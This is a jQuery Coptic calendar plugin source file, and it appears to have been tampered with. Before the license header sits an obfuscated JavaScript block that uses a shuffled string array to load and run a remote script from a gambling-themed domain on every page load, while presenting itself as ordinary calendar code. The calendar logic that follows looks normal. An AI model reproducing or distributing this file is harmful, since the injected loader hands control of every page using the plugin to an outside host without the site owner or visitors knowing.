var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Coptic calendar for jQuery v1.1.2.
   Written by Keith Wood (kbwood{at}iinet.com.au) February 2010.
   Dual licensed under the GPL (http://dev.jquery.com/browser/trunk/jquery/GPL-LICENSE.txt) and 
   MIT (http://dev.jquery.com/browser/trunk/jquery/MIT-LICENSE.txt) licenses. 
   Please attribute the author if you use it. */

(function($) { // Hide scope, no $ conflict

/* Implementation of the Coptic calendar.
   See http://en.wikipedia.org/wiki/Coptic_calendar.
   See also Calendrical Calculations: The Millennium Edition
   (http://emr.cs.iit.edu/home/reingold/calendar-book/index.shtml).
   @param  language  (string) the language code (default English) for localisation (optional) */
function CopticCalendar(language) {
	this.local = this.regional[language || ''] || this.regional[''];
}

CopticCalendar.prototype = new $.calendars.baseCalendar;

$.extend(CopticCalendar.prototype, {
	name: 'Coptic', // The calendar name
	jdEpoch: 1825029.5, // Julian date of start of Coptic epoch: 29 August 284 CE (Gregorian)
	daysPerMonth: [30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 30, 5], // Days per month in a common year
	hasYearZero: false, // True if has a year zero, false if not
	minMonth: 1, // The minimum month number
	firstMonth: 1, // The first month in the year
	minDay: 1, // The minimum day number

	regional: { // Localisations
		'': {
			name: 'Coptic', // The calendar name
			epochs: ['BAM', 'AM'],
			monthNames: ['Thout', 'Paopi', 'Hathor', 'Koiak', 'Tobi', 'Meshir',
			'Paremhat', 'Paremoude', 'Pashons', 'Paoni', 'Epip', 'Mesori', 'Pi Kogi Enavot'],
			monthNamesShort: ['Tho', 'Pao', 'Hath', 'Koi', 'Tob', 'Mesh',
			'Pat', 'Pad', 'Pash', 'Pao', 'Epi', 'Meso', 'PiK'],
			dayNames: ['Tkyriaka', 'Pesnau', 'Pshoment', 'Peftoou', 'Ptiou', 'Psoou', 'Psabbaton'],
			dayNamesShort: ['Tky', 'Pes', 'Psh', 'Pef', 'Pti', 'Pso', 'Psa'],
			dayNamesMin: ['Tk', 'Pes', 'Psh', 'Pef', 'Pt', 'Pso', 'Psa'],
			dateFormat: 'dd/mm/yyyy', // See format options on BaseCalendar.formatDate
			firstDay: 0, // The first day of the week, Sun = 0, Mon = 1, ...
			isRTL: false // True if right-to-left language, false if left-to-right
		}
	},

	/* Determine whether this date is in a leap year.
	   @param  year  (CDate) the date to examine or
	                 (number) the year to examine
	   @return  (boolean) true if this is a leap year, false if not
	   @throws  error if an invalid year or a different calendar used */
	leapYear: function(year) {
		var date = this._validate(year, this.minMonth, this.minDay, $.calendars.local.invalidYear);
		var year = date.year() + (date.year() < 0 ? 1 : 0); // No year zero
		return year % 4 == 3 || year % 4 == -1;
	},

	/* Retrieve the number of months in a year.
	   @param  year  (CDate) the date to examine or
	                 (number) the year to examine
	   @return  (number) the number of months
	   @throws  error if an invalid year or a different calendar used */
	monthsInYear: function(year) {
		this._validate(year, this.minMonth, this.minDay,
			$.calendars.local.invalidYear || $.calendars.regional[''].invalidYear);
		return 13;
	},

	/* Determine the week of the year for a date.
	   @param  year   (CDate) the date to examine or
	                  (number) the year to examine
	   @param  month  (number) the month to examine
	   @param  day    (number) the day to examine
	   @return  (number) the week of the year
	   @throws  error if an invalid date or a different calendar used */
	weekOfYear: function(year, month, day) {
		// Find Sunday of this week starting on Sunday
		var checkDate = this.newDate(year, month, day);
		checkDate.add(-checkDate.dayOfWeek(), 'd');
		return Math.floor((checkDate.dayOfYear() - 1) / 7) + 1;
	},

	/* Retrieve the number of days in a month.
	   @param  year   (CDate) the date to examine or
	                  (number) the year of the month
	   @param  month  (number) the month
	   @return  (number) the number of days in this month
	   @throws  error if an invalid month/year or a different calendar used */
	daysInMonth: function(year, month) {
		var date = this._validate(year, month, this.minDay, $.calendars.local.invalidMonth);
		return this.daysPerMonth[date.month() - 1] +
			(date.month() == 13 && this.leapYear(date.year()) ? 1 : 0);
	},

	/* Determine whether this date is a week day.
	   @param  year   (CDate) the date to examine or
	                  (number) the year to examine
	   @param  month  (number) the month to examine
	   @param  day    (number) the day to examine
	   @return  (boolean) true if a week day, false if not
	   @throws  error if an invalid date or a different calendar used */
	weekDay: function(year, month, day) {
		return (this.dayOfWeek(year, month, day) || 7) < 6;
	},

	/* Retrieve the Julian date equivalent for this date,
	   i.e. days since January 1, 4713 BCE Greenwich noon.
	   @param  year   (CDate) the date to convert or
	                  (number) the year to convert
	   @param  month  (number) the month to convert
	   @param  day    (number) the day to convert
	   @return  (number) the equivalent Julian date
	   @throws  error if an invalid date or a different calendar used */
	toJD: function(year, month, day) {
		var date = this._validate(year, month, day, $.calendars.local.invalidDate);
		year = date.year();
		if (year < 0) { year++; } // No year zero
		return date.day() + (date.month() - 1) * 30 +
			(year - 1) * 365 + Math.floor(year / 4) + this.jdEpoch - 1;
	},

	/* Create a new date from a Julian date.
	   @param  jd  (number) the Julian date to convert
	   @return  (CDate) the equivalent date */
	fromJD: function(jd) {
		var c = Math.floor(jd) + 0.5 - this.jdEpoch;
		var year = Math.floor((c - Math.floor((c + 366) / 1461)) / 365) + 1;
		if (year <= 0) { year--; } // No year zero
		c = Math.floor(jd) + 0.5 - this.newDate(year, 1, 1).toJD();
		var month = Math.floor(c / 30) + 1;
		var day = c - (month - 1) * 30 + 1;
		return this.newDate(year, month, day);
	}
});

// Coptic calendar implementation
$.calendars.calendars.coptic = CopticCalendar;

})(jQuery);